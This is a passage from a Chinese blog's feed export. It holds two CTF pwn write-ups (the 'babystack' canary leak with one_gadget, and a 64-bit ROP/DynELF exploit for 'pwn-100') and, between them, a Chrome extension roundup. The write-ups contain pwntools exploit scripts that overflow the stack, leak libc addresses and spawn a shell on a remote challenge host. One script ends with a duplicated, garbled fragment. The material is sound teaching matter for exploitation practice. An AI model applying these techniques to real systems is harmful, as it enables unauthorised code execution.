class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有了canary的值我们可以进行溢出，64位程序溢出还需要一个<code>pop rdi;ret</code><br><img src="https://img-blog.csdnimg.cn/20200325005956650.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="ROPgadget"></p><pre><code>0x0000000000400a93 : pop rdi ; ret</code></pre><h2 id="0x03-解题思路："><a href="#0x03-解题思路：" class="headerlink" title="0x03.解题思路："></a>0x03.解题思路：</h2><p>用’a’<em>0x88字节带出canary，知道canary即可进行溢出。<br>溢出利用puts函数输出puts的函数地址，再利用<code>puts_addr-libc.symbols['puts']</code>得到libc偏移offset<br><em>*execve_addr=offset+one_gadget得到的execve代码</em></em></p><h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04.exp"></a>0x04.exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">51596</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>execve <span class="token operator">=</span> <span class="token number">0x45216</span> <span class="token comment" spellcheck="true">#one_gadget得到</span>main_addr <span class="token operator">=</span> <span class="token number">0x400908</span> <span class="token comment" spellcheck="true">#main函数地址</span>rdi_addr <span class="token operator">=</span> <span class="token number">0x400a93</span> <span class="token comment" spellcheck="true">#pop rdi;ret</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token comment" spellcheck="true">#s和canary距离</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#要使用sendline，即输入'A'*0x88后还要有一个回车，目的是将canary尾部的'\x00'覆盖为'\x0A'</span><span class="token comment" spellcheck="true">#用puts函数输出canary时，puts函数遇到'\x00'会截断，使用'\x0A'覆盖'\x00'，才能将canary输出</span><span class="token comment" spellcheck="true">#注意，本程序是小端字节序（低位地址对应高位字节）</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#要等到'\n'之后再读取</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r.recv(7)是由于puts输出的canary最后一位是'\x0A',要重新换成'\x00'</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用puts函数将puts函数的地址输出</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>execve_addr <span class="token operator">=</span> offset <span class="token operator">+</span> execvepayload3 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>execve_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实用Chrome插件功能介绍系列&amp;&amp;安装指南</title>
      <link href="/2020/03/22/chrome/"/>
      <url>/2020/03/22/chrome/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Infinity-New-Tab"><a href="#0x00-Infinity-New-Tab" class="headerlink" title="0x00.Infinity New Tab"></a>0x00.Infinity New Tab</h2><p><img src="https://img-blog.csdnimg.cn/20200322004344837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Infinity New Tab"><br><img src="https://img-blog.csdnimg.cn/20200322005431651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="安装之后的界面"></p><blockquote><p>介绍：这是一款美化标签页的工具，功能强大，支持添加标签页网址图标。<br>推荐级别：3星级<br><a href="https://chrome.google.com/webstore/detail/infinity-new-tab-producti/dbfmnekepjoapopniengjbcpnbljalfg/related" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x01-集装箱"><a href="#0x01-集装箱" class="headerlink" title="0x01.集装箱"></a>0x01.集装箱</h2><p><img src="https://img-blog.csdnimg.cn/20200322010719582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="google助手"><br><img src="https://img-blog.csdnimg.cn/20200322010822852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="右键增强"></p><blockquote><p>介绍：集装箱插件是google助手、网盘助手、优惠购、增益功能等插件的合集。尤其要推荐一下右键增强功能，选择文本、右键选择集装箱，会出现很多功能，比如使用各种搜索引擎进行搜索，而且还能生成当前界面二维码，google助手功能也十分强大！<br>推荐级别：5星级<br><a href="https://chrome.google.com/webstore/detail/%E9%9B%86%E8%A3%85%E7%AE%B1/kbgigmcnifmaklccibmlepmahpfdhjch/related?hl=zh-CN" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x02-OneTab-Plus"><a href="#0x02-OneTab-Plus" class="headerlink" title="0x02.OneTab Plus"></a>0x02.OneTab Plus</h2><p><img src="https://img-blog.csdnimg.cn/2020032201213940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="整合标签页"></p><blockquote><p>介绍：OneTab Plus可以把多个标签页整合成一个列表形式的标签页，这个功能对我来说真的很好用，因为平时打比赛可能同时打开好几十个标签页…<br>推荐级别：4星级<br><a href="https://chrome.google.com/webstore/detail/onetab-plustab-manage-pro/lepdjbhbkpfenckechpdfohdmkhogojf/related" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x03-Adblock-Plus"><a href="#0x03-Adblock-Plus" class="headerlink" title="0x03.Adblock Plus"></a>0x03.Adblock Plus</h2><p><img src="https://img-blog.csdnimg.cn/20200322012942878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Adblock Plus功能"></p><blockquote><p>介绍：Chrome支持的广告屏蔽插件，可以屏蔽绝大多数网站广告，可以自行设置网站白名单，并不会降低网页打开速度。<br>推荐级别：3颗星<br><a href="https://chrome.google.com/webstore/detail/adblock-plus-free-ad-bloc/cfhdojbkjhnklbpkdaibdccddilifddb/related" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x04-Tampermonkey"><a href="#0x04-Tampermonkey" class="headerlink" title="0x04.Tampermonkey"></a>0x04.Tampermonkey</h2><p><img src="https://img-blog.csdnimg.cn/20200322015254707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Tampermonkey"></p><blockquote><p>介绍：Tampermonkey，国内称作“油猴”，是一个管理浏览器脚本的插件。它能安装众多实用的浏览器脚本。<br>推荐级别：4颗半星<br><a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><p><strong>油猴脚本：</strong></p><h3 id="1-Ac-baidu"><a href="#1-Ac-baidu" class="headerlink" title="1.Ac-baidu"></a>1.Ac-baidu</h3><p><img src="https://img-blog.csdnimg.cn/20200322015534813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Ac-baidu安装后界面"></p><blockquote><p>介绍：Ac-baidu是一款重定向优化搜索引擎的脚本，能大幅度提高搜索速度，优化显示界面。<br>推荐级别：3星级<br><a href="https://greasyfork.org/zh-CN/scripts/14178-ac-baidu-%E9%87%8D%E5%AE%9A%E5%90%91%E4%BC%98%E5%8C%96%E7%99%BE%E5%BA%A6%E6%90%9C%E7%8B%97%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2-%E5%8E%BB%E5%B9%BF%E5%91%8A-favicon-%E5%8F%8C%E5%88%97" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h3 id="2-哔哩哔哩播放器调整R"><a href="#2-哔哩哔哩播放器调整R" class="headerlink" title="2.哔哩哔哩播放器调整R"></a>2.哔哩哔哩播放器调整R</h3><p><img src="https://img-blog.csdnimg.cn/20200322021003993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="哔哩哔哩播放器调整R"><br><img src="https://img-blog.csdnimg.cn/20200322021118326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="脚本功能"></p><blockquote><p>介绍：把b站彻底变成学习网站！<br>推荐级别：3星级<br><a href="https://greasyfork.org/zh-CN/scripts/371672-%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9-bilibili-com-%E6%92%AD%E6%94%BE%E5%99%A8%E8%B0%83%E6%95%B4r-ver-stardust" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> tips </tag>
            
            <tag> chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64位程序rop链构造|攻防世界pwn进阶区 pwn-100</title>
      <link href="/2020/03/21/pwn-100/"/>
      <url>/2020/03/21/pwn-100/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一题和pwn-200有类似之处，都是栈溢出漏洞，可以循环泄露，所以都使用DynELF来泄露。但是pwn200是32位程序用rop，pwn100是64位程序用rop。区别在于32位程序利用栈布局，而64位程序调用参数是利用寄存器。且本题是用puts函数来泄露，puts函数不能指定输出字符串的长度。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="0x01-ida调试发现sub-40063D函数可以溢出"><a href="#0x01-ida调试发现sub-40063D函数可以溢出" class="headerlink" title="0x01.ida调试发现sub_40063D函数可以溢出"></a>0x01.ida调试发现sub_40063D函数可以溢出</h3><p><img src="https://img-blog.csdnimg.cn/20200316194943361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="0x02-cyclic计算溢出需要填充72字节"><a href="#0x02-cyclic计算溢出需要填充72字节" class="headerlink" title="0x02.cyclic计算溢出需要填充72字节"></a>0x02.cyclic计算溢出需要填充72字节</h3><h3 id="0x03-checksec看一下保护"><a href="#0x03-checksec看一下保护" class="headerlink" title="0x03.checksec看一下保护"></a>0x03.checksec看一下保护</h3><pre class="line-numbers language-yaml"><code class="language-yaml"> <span class="token key atrule">Arch</span><span class="token punctuation">:</span>     amd64<span class="token punctuation">-</span>64<span class="token punctuation">-</span>little    <span class="token key atrule">RELRO</span><span class="token punctuation">:</span>    Partial RELRO //可以修改GOT表    <span class="token key atrule">Stack</span><span class="token punctuation">:</span>    No canary found    <span class="token key atrule">NX</span><span class="token punctuation">:</span>       NX enabled    <span class="token key atrule">PIE</span><span class="token punctuation">:</span>      No PIE (0x400000)//未开启地址随机化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-利用思路："><a href="#0x04-利用思路：" class="headerlink" title="0x04.利用思路："></a>0x04.利用思路：</h3><blockquote><p>1.利用DynELF模块泄露system函数地址<br>2.构造rop链，写入”/bin/sh”<br>3.调用system函数</p></blockquote><h3 id="0x05-可以用vmmap查找binary文件地址"><a href="#0x05-可以用vmmap查找binary文件地址" class="headerlink" title="0x05.可以用vmmap查找binary文件地址"></a>0x05.可以用vmmap查找binary文件地址</h3><p><img src="https://img-blog.csdnimg.cn/20200316194318782.jpg" alt=""><br>这里找到一个 <code>rw-p</code>的地址，即<strong>可写地址 0x601000</strong>,pwn-200做的时候是用的bss段地址<code>bss_addr=elf.bss()</code>，但是这一题我看网上wp基本没有用bss段地址的，我自己试了一下用bss段地址打不通。</p><h3 id="0x06-用-ROPgadget-binary-pwn100-only-quot-pop-ret-quot-grep-rdi命令寻找ROP"><a href="#0x06-用-ROPgadget-binary-pwn100-only-quot-pop-ret-quot-grep-rdi命令寻找ROP" class="headerlink" title="0x06.用  ROPgadget --binary pwn100 --only &quot;pop|ret&quot; | grep rdi命令寻找ROP"></a>0x06.用  <code>ROPgadget --binary pwn100 --only "pop|ret" | grep rdi</code>命令寻找ROP</h3><p><img src="https://img-blog.csdnimg.cn/20200316194440265.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><pre class="line-numbers language-python"><code class="language-python">poprdi_addr<span class="token operator">=</span><span class="token number">0x400763</span>pop6_addr<span class="token operator">=</span><span class="token number">0x40075a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="0x07-32位程序和64位程序的差别"><a href="#0x07-32位程序和64位程序的差别" class="headerlink" title="0x07.32位程序和64位程序的差别"></a>0x07.32位程序和64位程序的差别</h3><blockquote><ul><li>32位程序中，函数调用是直接将参数压栈，需要用的时候直接将参数放在栈上，调用的函数就能直接取得参数并运算。</li><li>x64的gcc优化了x86的传参方式，x64程序设立了几个寄存器李存放参数，调用函数的时候先向寄存器之中放参数，当参数的数量大于寄存器的时候，才会向栈中放参数。</li></ul></blockquote><pre class="line-numbers language-powershell"><code class="language-powershell">fun<span class="token punctuation">(</span>1<span class="token punctuation">,</span>2<span class="token punctuation">,</span>3<span class="token punctuation">,</span>4<span class="token punctuation">,</span>5<span class="token punctuation">,</span>6<span class="token punctuation">,</span>7<span class="token punctuation">,</span>8<span class="token punctuation">,</span>9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span>当我们调用这个函数的时候<span class="token operator">/</span><span class="token operator">/</span>x86传参的方式是这样：push 9<span class="token punctuation">;</span>push 8<span class="token punctuation">;</span>···push 1<span class="token punctuation">;</span>call fun<span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span>x64传参方式：mov r9d 6<span class="token punctuation">;</span>mov r8d 5<span class="token punctuation">;</span>mov ecx 4<span class="token punctuation">;</span>mov edx 3<span class="token punctuation">;</span>mov esi 2<span class="token punctuation">;</span>mov edi 1<span class="token punctuation">;</span>mov DWORD PTR <span class="token namespace">[rsp+16]</span><span class="token punctuation">,</span> 9<span class="token punctuation">;</span>mov DWORD PTR <span class="token namespace">[rsp+8]</span><span class="token punctuation">,</span> 8<span class="token punctuation">;</span>mov DWORD PTR <span class="token namespace">[rsp]</span><span class="token punctuation">,</span> 7<span class="token punctuation">;</span>call fun<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>传参的顺序，默认是从最后一个参数先开始传入，x86和x64都是一样。</strong><br><a href="https://blog.csdn.net/qinying001/article/details/102922215" target="_blank" rel="noopener">参考blog</a></p><h3 id="0x08-写出leak函数"><a href="#0x08-写出leak函数" class="headerlink" title="0x08.写出leak函数"></a>0x08.写出leak函数</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="0x01-先尝试泄露"><a href="#0x01-先尝试泄露" class="headerlink" title="0x01.先尝试泄露"></a>0x01.先尝试泄露</h3><p><img src="https://img-blog.csdnimg.cn/20200316194453783.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200316194502980.jpg" alt=""><br><strong>0x4个字节时候才是需要泄露的地址</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    content <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-下面尝试补充成exp"><a href="#0x02-下面尝试补充成exp" class="headerlink" title="0x02.下面尝试补充成exp"></a>0x02.下面尝试补充成exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">36839</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>gpt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400763</span>junk <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">72</span>rop1 <span class="token operator">=</span> <span class="token number">0x40075a</span> <span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15</span>rop2 <span class="token operator">=</span> <span class="token number">0x400740</span> <span class="token comment" spellcheck="true">#rdx(r13),rsi(r14),edi(r15)</span>start_addr <span class="token operator">=</span> <span class="token number">0x400550</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x601000</span> <span class="token comment" spellcheck="true">#向该地址写入"/bin/sh"</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    content <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token punctuation">(</span>content <span class="token operator">or</span> <span class="token 